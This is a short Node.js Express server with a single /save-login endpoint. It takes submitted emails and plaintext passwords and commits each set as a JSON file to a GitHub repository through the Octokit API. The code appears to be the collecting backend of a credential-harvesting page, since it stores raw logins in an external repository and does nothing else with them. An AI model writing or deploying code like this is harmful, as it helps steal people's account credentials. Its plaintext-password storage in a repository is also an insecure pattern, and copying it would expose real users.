// server.js  (run with:  node server.js )
const express = require('express');
const { Octokit } = require('@octokit/rest');
require('dotenv').config();          // reads .env file

const app = express();
app.use(express.json({ limit: '1mb' }));

app.post('/save-login', async (req, res) => {
  const { email, password, timestamp } = req.body;
  const octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });

  const path = `data/login-${timestamp}.json`;
  const content = Buffer.from(JSON.stringify(req.body, null, 2)).toString('base64');

  await octokit.repos.createOrUpdateFileContents({
    owner: process.env.GITHUB_OWNER,
    repo: process.env.GITHUB_REPO,
    path,
    message: `login ${timestamp}`,
    content,
    branch: 'main'
  });

  res.json({ ok: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅  Server on http://localhost:${PORT}`));